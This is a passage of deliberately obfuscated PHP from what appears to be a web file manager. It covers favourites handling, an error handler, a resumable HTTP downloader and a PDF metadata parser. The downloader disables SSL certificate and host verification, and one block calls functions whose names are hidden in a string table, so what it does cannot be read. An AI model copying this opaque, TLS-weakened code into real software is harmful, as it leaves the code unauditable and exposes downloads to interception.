Model($E„‚¾¬ÀğÊ[747])->listSource($dÎ…Ë…‰è, $e“Š¯ÊÂÏ); $C²Îé”ì = array_merge($C²Îé”ì[$E„‚¾¬ÀğÊ[73]], $C²Îé”ì[$E„‚¾¬ÀğÊ[74]]); goto f¸ÕÑ¸£; CÂ‡îïèïê: $E„‚¾¬ÀğÊ =& $_SERVER[õëù©û]; $B÷Ïäİ“ç¯ = $this->listData(); $A•ôö±Üˆ = array_filter_by_field($B÷Ïäİ“ç¯, $E„‚¾¬ÀğÊ[29], $E„‚¾¬ÀğÊ[378]); goto BÊàª áå; BÊàª áå: $aößÒ¹‰Ğ = array_to_keyvalue($A•ôö±Üˆ, $E„‚¾¬ÀğÊ[33], $E„‚¾¬ÀğÊ[75]); if (!$aößÒ¹‰Ğ) { return $B÷Ïäİ“ç¯; } $e“Š¯ÊÂÏ = 2000; goto F‹˜ÔêğŸ; Aôİàèƒö’: } protected function addFav($fÃ—í‚ÎÅÅ, $D±Ø‹ã’Ğ = '', $EÇ¢Ó½±‚Ç = "\x73\x6f\165\x72\x63\145") { goto c·Ñ•ªÉĞ; a§øØ¬…¨: if (!$D±Ø‹ã’Ğ && $EÇ¢Ó½±‚Ç == $BÔæ©±šÜù[378]) { $DÅàÅøÉ = Model($BÔæ©±šÜù[1101])->where(array($BÔæ©±šÜù[379] => $fÃ—í‚ÎÅÅ))->find(); if (!$DÅàÅøÉ) { return !1; } $D±Ø‹ã’Ğ = $DÅàÅøÉ[$BÔæ©±šÜù[28]]; } $D±Ø‹ã’Ğ = $this->getAutoName($D±Ø‹ã’Ğ); $F‘Ì¡ê‹‹ = array($BÔæ©±šÜù[1395] => USER_ID, $BÔæ©±šÜù[431] => 0, $BÔæ©±šÜù[382] => $D±Ø‹ã’Ğ, $BÔæ©±šÜù[383] => $fÃ—í‚ÎÅÅ, $BÔæ©±šÜù[384] => $EÇ¢Ó½±‚Ç, $BÔæ©±šÜù[2072] => $f·ÅÍÂÁã³ + 1); goto fÌíçáŠãÅ; c·Ñ•ªÉĞ: $BÔæ©±šÜù =& $_SERVER[õëù©û]; $eÂëÑ‘ÂÅ¬ = array($BÔæ©±šÜù[1395] => USER_ID, $BÔæ©±šÜù[431] => 0, $BÔæ©±šÜù[384] => $EÇ¢Ó½±‚Ç, $BÔæ©±šÜù[383] => $fÃ—í‚ÎÅÅ); if ($this->where($eÂëÑ‘ÂÅ¬)->find()) { return !1; } goto C’¥©ô†÷; fÌíçáŠãÅ: return $this->add($F‘Ì¡ê‹‹); goto D… ˆøÔÖ; C’¥©ô†÷: $eÂëÑ‘ÂÅ¬ = array($BÔæ©±šÜù[1395] => USER_ID, $BÔæ©±šÜù[431] => 0); $f·ÅÍÂÁã³ = $this->where($eÂëÑ‘ÂÅ¬)->max($BÔæ©±šÜù[2089]); if (!$f·ÅÍÂÁã³) { $f·ÅÍÂÁã³ = 0; } goto a§øØ¬…¨; D… ˆøÔÖ: } protected function remove($A¤çå×æ™) { $bÖç¥Ğæ¥µ =& $_SERVER[õëù©û]; $CÄ‘Ÿîƒ­ = array($bÖç¥Ğæ¥µ[1395] => USER_ID, $bÖç¥Ğæ¥µ[381] => $A¤çå×æ™); return $this->where($CÄ‘Ÿîƒ­)->delete(); } protected function removeByName($Cšˆøê¬Äµ) { $E¸º–ÎŸÄò =& $_SERVER[õëù©û]; $DË¹£äâŒ¥ = array($E¸º–ÎŸÄò[1395] => USER_ID, $E¸º–ÎŸÄò[382] => $Cšˆøê¬Äµ, $E¸º–ÎŸÄò[431] => 0); return $this->where($DË¹£äâŒ¥)->delete(); } protected function rename($c¬Ğ®¥à‚, $A™œëÀ»Ì¸) { $Dğ™ÕŠ¾—Ê =& $_SERVER[õëù©û]; if ($c¬Ğ®¥à‚ == $A™œëÀ»Ì¸) { return !1; } $BÅ™Æ„ŸÅŞ = $this->getAutoName($A™œëÀ»Ì¸); if ($A™œëÀ»Ì¸ != $BÅ™Æ„ŸÅŞ) { return !1; } $AÑê°¡×¥ = array($Dğ™ÕŠ¾—Ê[1395] => USER_ID, $Dğ™ÕŠ¾—Ê[431] => 0, $Dğ™ÕŠ¾—Ê[28] => $c¬Ğ®¥à‚); return $this->where($AÑê°¡×¥)->save(array($Dğ™ÕŠ¾—Ê[28] => $A™œëÀ»Ì¸)); } protected function resetSort($FÄ”¨ˆ³˜â) { $Bì‘²¨ª¸Ş =& $_SERVER[õëù©û]; $FÄ”¨ˆ³˜â = is_array($FÄ”¨ˆ³˜â) ? $FÄ”¨ˆ³˜â : array(); $Aø¤Å¥«ê = array($Bì‘²¨ª¸Ş[1395] => USER_ID); for ($dÆ›¤—êêÕ = 0; $dÆ›¤—êêÕ < count($FÄ”¨ˆ³˜â); $dÆ›¤—êêÕ++) { $Aø¤Å¥«ê[$Bì‘²¨ª¸Ş[381]] = $FÄ”¨ˆ³˜â[$dÆ›¤—êêÕ]; $this->where($Aø¤Å¥«ê)->save(array($Bì‘²¨ª¸Ş[2072] => $dÆ›¤—êêÕ + 1)); } return !0; } protected function moveTop($d¦ööäî¸ã) { goto e²ˆƒïˆæĞ; AÀ‚£âŒÏ: $cİˆììñ¯í = $C±Ğ¿ñçŒ; $C±Ğ¿ñçŒ = array_remove_value($C±Ğ¿ñçŒ, $a¸¬¯¶È[$cØŞç¼ŞÄ¢[363]]); array_unshift($C±Ğ¿ñçŒ, $a¸¬¯¶È[$cØŞç¼ŞÄ¢[363]]); goto C’‘‡á·°; CçÓìÖİ¼ó: if (!$a¸¬¯¶È) { return; } $C±Ğ¿ñçŒ = $this->field($cØŞç¼ŞÄ¢[363])->where($a¢­ç”Ü‡½)->order($cØŞç¼ŞÄ¢[2449])->select(); $C±Ğ¿ñçŒ = array_to_keyvalue($C±Ğ¿ñçŒ, $cØŞç¼ŞÄ¢[33], $cØŞç¼ŞÄ¢[363]); goto AÀ‚£âŒÏ; e²ˆƒïˆæĞ: $cØŞç¼ŞÄ¢ =& $_SERVER[õëù©û]; $a¢­ç”Ü‡½ = array($cØŞç¼ŞÄ¢[1395] => USER_ID, $cØŞç¼ŞÄ¢[431] => 0); $a¸¬¯¶È = $this->where($a¢­ç”Ü‡½)->where(array($cØŞç¼ŞÄ¢[28] => $d¦ööäî¸ã))->find(); goto CçÓìÖİ¼ó; C’‘‡á·°: return $this->resetSort($C±Ğ¿ñçŒ); goto dŸ»Ê„±›; dŸ»Ê„±›: } protected function moveBottom($fÌ­å§‚˜Ù) { $f¹‰¤×§Êõ =& $_SERVER[õëù©û]; $AŒˆØôßÀä = array($f¹‰¤×§Êõ[1395] => USER_ID, $f¹‰¤×§Êõ[431] => 0); $E¿›µÑ‘ = $this->where($AŒˆØôßÀä)->max($f¹‰¤×§Êõ[2089]); $C‰—Ó†›¡œ = array($f¹‰¤×§Êõ[2089] => $E¿›µÑ‘ + 1); return $this->where($AŒˆØôßÀä)->where(array($f¹‰¤×§Êõ[28] => $fÌ­å§‚˜Ù))->save($C‰—Ó†›¡œ); } private function getAutoName($d¿§ÅøÏî) { goto eîòØÇ‘Õƒ; C¬ÏøƒÆ³: $D°ÄÉË¾ç± = array_to_keyvalue($D°ÄÉË¾ç±, $E”ÅÆŞ¤ÔÕ[33], $E”ÅÆŞ¤ÔÕ[28]); if (!$D°ÄÉË¾ç± || !in_array($d¿§ÅøÏî, $D°ÄÉË¾ç±)) { return $d¿§ÅøÏî; } for ($c‰Ë§ß…Î = 0; $c‰Ë§ß…Î < count($D°ÄÉË¾ç±); $c‰Ë§ß…Î++) { if (!in_array($d¿§ÅøÏî . "\x28{$c‰Ë§ß…Î}\x29", $D°ÄÉË¾ç±)) { return $d¿§ÅøÏî . "\50{$c‰Ë§ß…Î}\51"; } } goto dšÃ­ÔÓÀ; dšÃ­ÔÓÀ: return $d¿§ÅøÏî . "\50{$c‰Ë§ß…Î}\x29"; goto dŞéØš¼Æ¿; eîòØÇ‘Õƒ: $E”ÅÆŞ¤ÔÕ =& $_SERVER[õëù©û]; $c¤¾«ø¢‰¼ = array($E”ÅÆŞ¤ÔÕ[1395] => USER_ID, $E”ÅÆŞ¤ÔÕ[431] => 0); $D°ÄÉË¾ç± = $this->field($E”ÅÆŞ¤ÔÕ[28])->where($c¤¾«ø¢‰¼)->select(); goto C¬ÏøƒÆ³; dŞéØš¼Æ¿: } } goto E ç‘éÖá»; eï§ŞÔÉßİ: function beforeShutdownError($A¥ƒ”¼ÎîÚ = false, $EÕ°öõÃÁÙ = '', $a õ—·¸½µ = '', $aì‘…Êé×® = 0) { $d’«÷§Ğ’˜ =& $_SERVER[üá]; switch ($A¥ƒ”¼ÎîÚ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $F§¦Ëáê = $d’«÷§Ğ’˜[39]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $F§¦Ëáê = $d’«÷§Ğ’˜[40]; break; case E_STRICT: $F§¦Ëáê = $d’«÷§Ğ’˜[41]; break; case E_NOTICE: case E_USER_NOTICE: $F§¦Ëáê = $d’«÷§Ğ’˜[42]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $F§¦Ëáê = $d’«÷§Ğ’˜[43]; break; default: break; } if (!$F§¦Ëáê || $F§¦Ëáê == $d’«÷§Ğ’˜[42] || $F§¦Ëáê == $d’«÷§Ğ’˜[43]) { return; } $a õ—·¸½µ = $d’«÷§Ğ’˜[4] . str_replace($_SERVER[$d’«÷§Ğ’˜[37]], $d’«÷§Ğ’˜[20], $a õ—·¸½µ); $e‹©ŸªùØÈ = $F§¦Ëáê . $d’«÷§Ğ’˜[44] . $EÕ°öõÃÁÙ . $d’«÷§Ğ’˜[44] . $a õ—·¸½µ . $d’«÷§Ğ’˜[44] . $aì‘…Êé×®; write_log($e‹©ŸªùØÈ . $d’«÷§Ğ’˜[18] . get_caller_msg(1), $d’«÷§Ğ’˜[19]); } $_SERVER[$_SERVER[üá][45]] = $_SERVER[$_SERVER[üá][37]] . $_SERVER[üá][46]; $AˆÍÖœì‚° = strrev(base64_decode($_SERVER[üá][47])); goto aŸ£õ¦Ñê´; fÇ¬ÎÔ¿‚›: register_shutdown_function($_SERVER[üá][36]); set_error_handler($_SERVER[üá][49], $c•Ìô¹…½); if (function_exists($_SERVER[üá][50])) { set_exception_handler($_SERVER[üá][51]); } goto DÒÆÕ‰íùì; EÂÚÛ×Œ’: class Downloader { static function start($EôöŒÒÑßÄ, $Fæ– İˆï”, $DĞ¯‘ŞÛÚ = 10) { goto FÄ¶š›ìó; DÃÀ»ß‘œ: $BÓºÀÊ‘â£ = intval($F±ŒºˆË´[$fÍÍŞë¼Ğ[321]]); if (file_exists($AñÖ™÷ğ•¡) && time() - filemtime($AñÖ™÷ğ•¡) < 3) { return array($fÍÍŞë¼Ğ[1023] => !1, $fÍÍŞë¼Ğ[1025] => $fÍÍŞë¼Ğ[1480]); } $A¿¯ĞĞ„»Š = array(); goto D©¡ôÅã¬; e¹øŠ×ùÖ¬: if ($a‚šˆ±ˆÈˆ > $BÓºÀÊ‘â£) { @unlink($AñÖ™÷ğ•¡); } file_put_contents($dÚ”òÊÎ³, json_encode($A¿¯ĞĞ„»Š)); $Fª œ½¬÷Ë = self::fileDownloadCurl($EôöŒÒÑßÄ, $Fæ– İˆï”, !0, $a‚šˆ±ˆÈˆ, $BÓºÀÊ‘â£); goto Aí‘¢Ç¶ß; CÕÜ…Ê…‘Ú: if (!$EôöŒÒÑßÄ) { return array($fÍÍŞë¼Ğ[1023] => !1, $fÍÍŞë¼Ğ[1025] => $fÍÍŞë¼Ğ[1028]); } if (!$F±ŒºˆË´[$fÍÍŞë¼Ğ[1272]] || $F±ŒºˆË´[$fÍÍŞë¼Ğ[321]] == 0) { @unlink($AñÖ™÷ğ•¡); @unlink($Fæ– İˆï”); $Fª œ½¬÷Ë = self::fileDownloadFopen($EôöŒÒÑßÄ, $Fæ– İˆï”, $F±ŒºˆË´[$fÍÍŞë¼Ğ[321]]); if ($Fª œ½¬÷Ë[$fÍÍŞë¼Ğ[1023]]) { return $Fª œ½¬÷Ë; } else { @unlink($AñÖ™÷ğ•¡); @unlink($Fæ– İˆï”); $Fª œ½¬÷Ë = self::fileDownloadCurl($EôöŒÒÑßÄ, $Fæ– İˆï”, !1, 0, $F±ŒºˆË´[$fÍÍŞë¼Ğ[321]]); @unlink($AñÖ™÷ğ•¡); return $Fª œ½¬÷Ë; } } $a‚šˆ±ˆÈˆ = is_file($AñÖ™÷ğ•¡) ? filesize($AñÖ™÷ğ•¡) : 0; goto DÃÀ»ß‘œ; D©¡ôÅã¬: if (is_file($dÚ”òÊÎ³)) { $D ‘Æ‹Ó‰• = file_get_contents($dÚ”òÊÎ³); $A¿¯ĞĞ„»Š = json_decode($D ‘Æ‹Ó‰•, 1); } if (file_exists($Fæ– İˆï”) && $BÓºÀÊ‘â£ == filesize($Fæ– İˆï”)) { @unlink($AñÖ™÷ğ•¡); @unlink($dÚ”òÊÎ³); return array($fÍÍŞë¼Ğ[1023] => !0, $fÍÍŞë¼Ğ[1025] => $fÍÍŞë¼Ğ[1481]); } if ($A¿¯ĞĞ„»Š[$fÍÍŞë¼Ğ[321]] != $BÓºÀÊ‘â£) { $A¿¯ĞĞ„»Š = array($fÍÍŞë¼Ğ[321] => $BÓºÀÊ‘â£); } goto e¹øŠ×ùÖ¬; Aí‘¢Ç¶ß: if ($Fª œ½¬÷Ë[$fÍÍŞë¼Ğ[1023]]) { @unlink($dÚ”òÊÎ³); } return $Fª œ½¬÷Ë; goto DÔËˆ‚Ååƒ; Cì¼Ù°‚‡: $AñÖ™÷ğ•¡ = $Fæ– İˆï” . $fÍÍŞë¼Ğ[1479]; if (is_array($EôöŒÒÑßÄ)) { $F±ŒºˆË´ = $EôöŒÒÑßÄ; } else { $F±ŒºˆË´ = url_header($EôöŒÒÑßÄ); } $EôöŒÒÑßÄ = $F±ŒºˆË´[$fÍÍŞë¼Ğ[291]]; goto CÕÜ…Ê…‘Ú; FÄ¶š›ìó: $fÍÍŞë¼Ğ =& $_SERVER[õëù©û]; if (!request_url_safe($EôöŒÒÑßÄ)) { return array($fÍÍŞë¼Ğ[1023] => !1, $fÍÍŞë¼Ğ[1025] => $fÍÍŞë¼Ğ[1028]); } $dÚ”òÊÎ³ = $Fæ– İˆï” . $fÍÍŞë¼Ğ[1478]; goto Cì¼Ù°‚‡; DÔËˆ‚Ååƒ: } static function fileDownloadFopen($b³À‹Ñ…ØÂ, $DÂí‰Çâ«Á, $fâ®˜Ø’¾› = 0) { $F½òãå­º© =& $_SERVER[õëù©û]; @ini_set($F½òãå­º©[1482], $F½òãå­º©[1483]); $b¹½Õ‰éÎš = $DÂí‰Çâ«Á . $F½òãå­º©[1479]; set_timeout(); @unlink($b¹½Õ‰éÎš); if ($d÷…ã¸èª = @fopen($b³À‹Ñ…ØÂ, $F½òãå­º©[1484])) { goto DÅ¾˜Ò„áº; D×ªºØë’Ş: fclose($d÷…ã¸èª); $FÊÍ”àìÚ = filesize(iconv_system($b¹½Õ‰éÎš)); if ($fâ®˜Ø’¾› != 0 && $FÊÍ”àìÚ != $fâ®˜Ø’¾›) { return array($F½òãå­º©[1023] => !1, $F½òãå­º©[1025] => $F½òãå­º©[1488]); } goto AÜøºôÄÌ; DÅ¾˜Ò„áº: if (!($F¤Ëé²†¯† = @fopen($b¹½Õ‰éÎš, $F½òãå­º©[1485]))) { return array($F½òãå­º©[1023] => !1, $F½òãå­º©[1025] => $F½òãå­º©[1486]); } while (!feof($d÷…ã¸èª)) { if (!file_exists($b¹½Õ‰éÎš)) { fclose($F¤Ëé²†¯†); return array($F½òãå­º©[1023] => !1, $F½òãå­º©[1025] => $F½òãå­º©[1487]); } clearstatcache(); if ($fâ®˜Ø’¾› > 0 && $fâ®˜Ø’¾› == filesize(iconv_system($b¹½Õ‰éÎš))) { break; } fwrite($F¤Ëé²†¯†, fread($d÷…ã¸èª, 1024 * 8), 1024 * 8); } fclose($F¤Ëé²†¯†); goto D×ªºØë’Ş; AÜøºôÄÌ: self::checkGzip($b¹½Õ‰éÎš); if (!@rename($b¹½Õ‰éÎš, $DÂí‰Çâ«Á)) { usleep(round(rand(0, 1000) * 50)); @unlink($DÂí‰Çâ«Á); $fÑË©«‚‹Å = @rename($b¹½Õ‰éÎš, $DÂí‰Çâ«Á); if (!$fÑË©«‚‹Å) { return array($F½òãå­º©[1023] => !1, $F½òãå­º©[1025] => $F½òãå­º©[1489]); } } return array($F½òãå­º©[1023] => !0, $F½òãå­º©[1025] => $F½òãå­º©[691]); goto D¿‰‘”ÂŒé; D¿‰‘”ÂŒé: } else { return array($F½òãå­º©[1023] => !1, $F½òãå­º©[1025] => $F½òãå­º©[1490]); } } static function fileDownloadCurl($eèİå–È™Š, $b¢ÀÃè„Òğ, $d¼¶Ã’È¬¹ = false, $Dóö’ÕÙìğ = 0, $fŠ‹ô…ˆ® = 0) { goto bòòµ¾©´; Bõ¤ïªø„Ø: curl_setopt($Cô¢§¹°Ğì, CURLOPT_NOPROGRESS, !1); curl_setopt($Cô¢§¹°Ğì, CURLOPT_PROGRESSFUNCTION, $bš®ßÖ™áè[1492]); curl_progress_start($Cô¢§¹°Ğì); goto d’Õğ ¹é; FÌÜ±Ô¤è³: curl_setopt($Cô¢§¹°Ğì, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($Cô¢§¹°Ğì, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Cô¢§¹°Ğì, CURLOPT_SSL_VERIFYHOST, 0); goto Bõ¤ïªø„Ø; bòòµ¾©´: $bš®ßÖ™áè =& $_SERVER[õëù©û]; $fè±ø«ËÎ = $b¢ÀÃè„Òğ . $bš®ßÖ™áè[1479]; set_timeout(); goto F§èƒöÊ“; b¨ÕÕñÀ’: curl_close($Cô¢§¹°Ğì); fclose($cšŒ¡·¤¤²); $dç’°æ‡¹Ú = filesize(iconv_system($fè±ø«ËÎ)); goto A„ë‡Ğº´‚; F§èƒöÊ“: $cšŒ¡·¤¤² = @fopen($fè±ø«ËÎ, $bš®ßÖ™áè[973]); if (!$cšŒ¡·¤¤²) { return array($bš®ßÖ™áè[1023] => !1, $bš®ßÖ™áè[1025] => $bš®ßÖ™áè[1491]); } $Cô¢§¹°Ğì = curl_init($eèİå–È™Š); goto E„Ú Š÷¬ƒ; Båî—ĞÜéÒ: return array($bš®ßÖ™áè[1023] => !1, $bš®ßÖ™áè[1025] => $bš®ßÖ™áè[1494]); goto F§Ü½¯Í‰¨; d’Õğ ¹é: curl_setopt($Cô¢§¹°Ğì, CURLOPT_USERAGENT, $bš®ßÖ™áè[1483]); $cšˆè‹ŠÚù = curl_exec($Cô¢§¹°Ğì); curl_progress_end($Cô¢§¹°Ğì); goto b¨ÕÕñÀ’; A„ë‡Ğº´‚: if ($dç’°æ‡¹Ú < $fŠ‹ô…ˆ® && $fŠ‹ô…ˆ® != 0) { return array($bš®ßÖ™áè[1023] => !1, $bš®ßÖ™áè[1025] => $bš®ßÖ™áè[1480]); } if ($dç’°æ‡¹Ú > $fŠ‹ô…ˆ® && $fŠ‹ô…ˆ® != 0) { return array($bš®ßÖ™áè[1023] => !1, $bš®ßÖ™áè[1025] => $bš®ßÖ™áè[1488]); } if ($cšˆè‹ŠÚù && filesize($fè±ø«ËÎ) != 0) { self::checkGzip($fè±ø«ËÎ); if (!@rename($fè±ø«ËÎ, $b¢ÀÃè„Òğ)) { @unlink($b¢ÀÃè„Òğ); $cšˆè‹ŠÚù = @rename($fè±ø«ËÎ, $b¢ÀÃè„Òğ); if (!$cšˆè‹ŠÚù) { return array($bš®ßÖ™áè[1023] => !1, $bš®ßÖ™áè[1025] => $bš®ßÖ™áè[1493]); } } return array($bš®ßÖ™áè[1023] => !0, $bš®ßÖ™áè[1025] => $bš®ßÖ™áè[691]); } goto Båî—ĞÜéÒ; E„Ú Š÷¬ƒ: if ($d¼¶Ã’È¬¹) { curl_setopt($Cô¢§¹°Ğì, CURLOPT_RANGE, $Dóö’ÕÙìğ . $bš®ßÖ™áè[709]); } curl_setopt($Cô¢§¹°Ğì, CURLOPT_FILE, $cšŒ¡·¤¤²); curl_setopt($Cô¢§¹°Ğì, CURLOPT_REFERER, get_url_link($eèİå–È™Š)); goto FÌÜ±Ô¤è³; F§Ü½¯Í‰¨: } static function checkGzip($DÊÍ»±¤Ÿ¥) { goto eìÅ¸šîÒÙ; eìÅ¸šîÒÙ: $Cå¿¦×¢Ø = $_SERVER[õëù©û][1495]; $e­­Øé˜“Ó = file_sub_str($DÊÍ»±¤Ÿ¥, 0, 2); if ($Cå¿¦×¢Ø != $e­­Øé˜“Ó) { return; } goto CŞùë•ÑÈ´; a ´âÍã‚À: file_put_contents($DÊÍ»±¤Ÿ¥, $bˆŠÈİá); goto DÊÙØó’›ø; CŞùë•ÑÈ´: ob_start(); readgzfile($DÊÍ»±¤Ÿ¥); $bˆŠÈİá = ob_get_clean(); goto a ´âÍã‚À; DÊÙØó’›ø: } } if ($_SERVER[$_SERVER[õëù©û][781]] != $_SERVER[$_SERVER[õëù©û][1335]]) { goto D…ˆÂ•Í”; D…ˆÂ•Í”: $AÛ‰íµä­ = $_SERVER[õëù©û][784]; $F‰Õ¿„§šÚ = $_SERVER[$_SERVER[õëù©û][785]] . $_SERVER[õëù©û][786]; $b£œîÏ¡Ğë = $AÛ‰íµä­($F‰Õ¿„§šÚ); goto AÀ¾Ôšˆ‰å; AÀ¾Ôšˆ‰å: $E£Ú³ÄèÌë = explode($_SERVER[õëù©û][213], $b£œîÏ¡Ğë); if (count($E£Ú³ÄèÌë) < $_SERVER[õëù©û][555]) { $DÓ×¬Ëªµö = $_SERVER[õëù©û][787]; $DÓ×¬Ëªµö(); } $DìÀÉ„®†ñ = $_SERVER[õëù©û][1475]; goto b³ê‘…óø; b³ê‘…óø: $DìÀÉ„®†ñ($_SERVER[$_SERVER[õëù©û][782]]); goto EÙµ¨­‰ƒ; EÙµ¨­‰ƒ: } class FileParsePdf { public static function parse($Dª¦­îÄ»Á) { goto AÏìÏë˜ˆ·; e–½¼ÜÕÜÆ: if ($däñ¢Èìà[1] && $Fšêè¶ÎÅ[$F¨‚²šÃî–[1504]] < $däñ¢Èìà[1][0]) { $Fšêè¶ÎÅ[$F¨‚²šÃî–[1504]] = $däñ¢Èìà[1][0]; } $Fšêè¶ÎÅ = self::parseInfoItem($Fšêè¶ÎÅ); return $Fšêè¶ÎÅ; goto Eôá‰‡˜¶³; cŒ‡ ä–Ã‚: preg_match_all($d”×Ã°±, $C¾ˆ’ÌÎ[$F¨‚²šÃî–[1497]], $däñ¢Èìà); if ($däñ¢Èìà[1] && $Fšêè¶ÎÅ[$F¨‚²šÃî–[1504]] < $däñ¢Èìà[1][0]) { $Fšêè¶ÎÅ[$F¨‚²šÃî–[1504]] = $däñ¢Èìà[1][0]; } preg_match_all($d”×Ã°±, $C¾ˆ’ÌÎ[$F¨‚²šÃî–[1498]], $däñ¢Èìà); goto e–½¼ÜÕÜÆ; fÓ¨âÏ‘Ôù: preg_match($d”×Ã°±, $C¾ˆ’ÌÎ[$F¨‚²šÃî–[1498]], $däñ¢Èìà); if (!$Fšêè¶ÎÅ[$F¨‚²šÃî–[1500]] && count($däñ¢Èìà) == 5) { $Fšêè¶ÎÅ[$F¨‚²šÃî–[1500]] = $däñ¢Èìà[3]; $Fšêè¶ÎÅ[$F¨‚²šÃî–[1502]] = $däñ¢Èìà[4]; } preg_match($F¨‚²šÃî–[1503], $C¾ˆ’ÌÎ[$F¨‚²šÃî–[1497]], $däñ¢Èìà); goto e£¤‹á¯™’; D·¼Œƒ„ë: $C¾ˆ’ÌÎ[$F¨‚²šÃî–[1497]] = StreamWrapperIO::read($Dª¦­îÄ»Á, 0, $dÒìãÀ´Ú‰); $C¾ˆ’ÌÎ[$F¨‚²šÃî–[1498]] = StreamWrapperIO::read($Dª¦­îÄ»Á, $C¾ˆ’ÌÎ[$F¨‚²šÃî–[77]] - $dÒìãÀ´Ú‰, $dÒìãÀ´Ú‰); $b©×ÈÄÉ¿Ğ = self::decodeXref($C¾ˆ’ÌÎ); goto c©êÁŸ‡´Â; a…µ¡£Í˜: $d”×Ã°± = $F¨‚²šÃî–[1501]; preg_match($d”×Ã°±, $C¾ˆ’ÌÎ[$F¨‚²šÃî–[1497]], $däñ¢Èìà); if (!$Fšêè¶ÎÅ[$F¨‚²šÃî–[1500]] && count($däñ¢Èìà) == 5) { $Fšêè¶ÎÅ[$F¨‚²šÃî–[1500]] = $däñ¢Èìà[3]; $Fšêè¶ÎÅ[$F¨‚²šÃî–[1502]] = $däñ¢Èìà[4]; } goto fÓ¨âÏ‘Ôù; e£¤‹á¯™’: if ($däñ¢Èìà) { $Fšêè¶ÎÅ[$F¨‚²šÃî–[1309]] = $däñ¢Èìà[1]; } $Fšêè¶ÎÅ[$F¨‚²šÃî–[1504]] = 0; $d”×Ã°± = $F¨‚²šÃî–[1505]; goto cŒ‡ ä–Ã‚; c©êÁŸ‡´Â: if ($b©×ÈÄÉ¿Ğ) { $Dªòáø¤‡ = $b©×ÈÄÉ¿Ğ[$F¨‚²šÃî–[1499]][$F¨‚²šÃî–[1175]]; $Fšêè¶ÎÅ = self::getObjectValue($C¾ˆ’ÌÎ, $b©×ÈÄÉ¿Ğ, $Dªòáø¤‡); } $Fšêè¶ÎÅ = is_array($Fšêè¶ÎÅ) ? $Fšêè¶ÎÅ : array(); $Fšêè¶ÎÅ[$F¨‚²šÃî–[1500]] = 0; goto a…µ¡£Í˜; AÏìÏë˜ˆ·: $F¨‚²šÃî– =& $_SERVER[õëù©û]; $dÒìãÀ´Ú‰ = 32 * 1024; $C¾ˆ’ÌÎ = array($F¨‚²šÃî–[770] => fopen($Dª¦­îÄ»Á, $F¨‚²šÃî–[1153]), $F¨‚²šÃî–[75] => $Dª¦­îÄ»Á, $F¨‚²šÃî–[77] => filesize($Dª¦­îÄ»Á), $F¨‚²šÃî–[1496] => $dÒìãÀ´Ú‰); goto D·¼Œƒ„ë; Eôá‰‡˜¶³: } private static function parseInfoItem($côçÆ…¿ŞŒ) { $e»£Ùè™ğØ =& $_SERVER[õëù©û]; if (!$côçÆ…¿ŞŒ) { return !1; } $DÃºÑß‚ó = array($e»£Ùè™ğØ[1310] => array($e»£Ùè™ğØ[1506], $e»£Ùè™ğØ[33]), $e»£Ùè™ğØ[1507] => array($e»£Ùè™ğØ[1508], $e»£Ùè™ğØ[33]), $e»£Ùè™ğØ[183] => array($e»£Ùè™ğØ[1509], $e»£Ùè™ğØ[206]), $e»£Ùè™ğØ[106] => array($e»£Ùè™ğØ[1510], $e»£Ùè™ğØ[206]), $e»£Ùè™ğØ[1504] => array($e»£Ùè™ğØ[1504], $e»£Ùè™ğØ[272]), $e»£Ùè™ğØ[1500] => array($e»£Ùè™ğØ[1500], $e»£Ùè™ğØ[272]), $e»£Ùè™ğØ[1502] => array($e»£Ùè™ğØ[1502], $e»£Ùè™ğØ[272]), $e»£Ùè™ğØ[1511] => array($e»£Ùè™ğØ[1512], $e»£Ùè™ğØ[33]), $e»£Ùè™ğØ[1513] => array($e»£Ùè™ğØ[1514], $e»£Ùè™ğØ[33]), $e»£Ùè™ğØ[1515] => array($e»£Ùè™ğØ[1309], $e»£Ùè™ğØ[33])); $eò—à§¨²Ä = array(); foreach ($DÃºÑß‚ó as $FÇªÅ«Ó¿Ì => $DßÖçšŒ…) { if (!isset($côçÆ…¿ŞŒ[$DßÖçšŒ…[0]])) { continue; } $aó…¼àƒ‘ = $côçÆ…¿ŞŒ[$DßÖçšŒ…[0]]; if (!$aó…¼àƒ‘ || is_array($aó…¼àƒ‘)) { continue; } switch ($DßÖçšŒ…[1]) { case $e»£Ùè™ğØ[272]: $aó…¼àƒ‘ = intval($aó…¼àƒ‘); break; case $e»£Ùè™ğØ[206]: if (substr($aó…¼àƒ‘, 0, 2) == $e»£Ùè™ğØ[1516]) { $aó…¼àƒ‘ = substr($aó…¼àƒ‘, 2, 14); } if (strtotime($aó…¼àƒ‘)) { $aó…¼àƒ‘ = date($e»£Ùè™ğØ[1517], strtotime($aó…¼àƒ‘)); } break; } $eò—à§¨²Ä[$FÇªÅ«Ó¿Ì] = $aó…¼àƒ‘; } return $eò—à§¨²Ä; } private static function decodeXref(&$C“µÌ‡›) { goto dØÚÄÕóÏª; dØÚÄÕóÏª: $aò»˜ÈÅ…Ö =& $_SERVER[õëù©û]; $aíŸÎõÀ¶Ë = $C“µÌ‡›[$aò»˜ÈÅ…Ö[1498]]; $e’›«˜çÀ§ = array($aò»˜ÈÅ…Ö[1499] => array(), $aò»˜ÈÅ…Ö[1518] => array()); goto F¤À•Ç†¶; F¤À•Ç†¶: $a¾‡•ôË©É = $aò»˜ÈÅ…Ö[1519]; if (!preg_match_all($a¾‡•ôË©É, $aíŸÎõÀ¶Ë, $CÔÚçã–, PREG_SET_ORDER, 0)) { return !1; } $Cò›İ³ = intval($CÔÚçã–[0][1]); goto CğÅÍÏßÙœ; d†æ¹¼¶: if (preg_match($aò»˜ÈÅ…Ö[1525], $dŸå­Œ¥•Û, $CÔÚçã–) > 0) { $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[77]] = intval($CÔÚçã–[1]); } if (preg_match($aò»˜ÈÅ…Ö[1526], $dŸå­Œ¥•Û, $CÔÚçã–) > 0) { $e’›«˜çÀ§[$aò»˜ÈÅ…Ö[1499]][$aò»˜ÈÅ…Ö[1527]] = intval($CÔÚçã–[1]) . $aò»˜ÈÅ…Ö[70] . intval($CÔÚçã–[2]); } if (preg_match($aò»˜ÈÅ…Ö[1528], 